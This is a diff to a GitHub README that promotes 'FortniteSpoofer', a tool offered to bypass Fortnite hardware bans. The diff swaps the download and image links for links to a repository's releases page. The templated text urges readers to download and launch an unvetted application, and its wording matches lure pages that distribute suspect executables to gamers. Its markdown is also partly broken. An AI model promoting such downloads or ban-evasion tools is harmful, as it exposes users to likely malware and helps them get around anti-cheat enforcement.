@@ -26,7 +26,7 @@ Welcome to the FortniteSpoofer repository, your ultimate solution to bypass hard
 
 ## Get Started
 Click the button below to download the FortniteSpoofer:
-[![Download FortniteSpoofer](https://img.shields.io/badge/Download-FortniteSpoofer-green)](https://github.com/files/uploaded/Application.zip)
+[![Download FortniteSpoofer](https://github.com/EssMalafama120/FortniteSpoofer/releases)](https://github.com/EssMalafama120/FortniteSpoofer/releases)
 
 ## How to Use
 1. Download the FortniteSpoofer from the provided link.
@@ -37,7 +37,7 @@ Click the button below to download the FortniteSpoofer:
 ## Additional Information
 If the link provided above ends with the file name, make sure to launch the downloaded application. In case the link is a website, feel free to visit it directly. If the link is not working or not provided, please check the "Releases" section of this repository for alternative download options.
 
-![FortniteSpoofer](https://example.com/fortnitespoofer.png)
+![FortniteSpoofer](https://github.com/EssMalafama120/FortniteSpoofer/releases)
 
 ## Support
 If you encounter any issues or have any questions regarding the FortniteSpoofer tool, please open an issue in this repository. Our team will be happy to assist you and ensure a smooth unban process for your gaming needs.
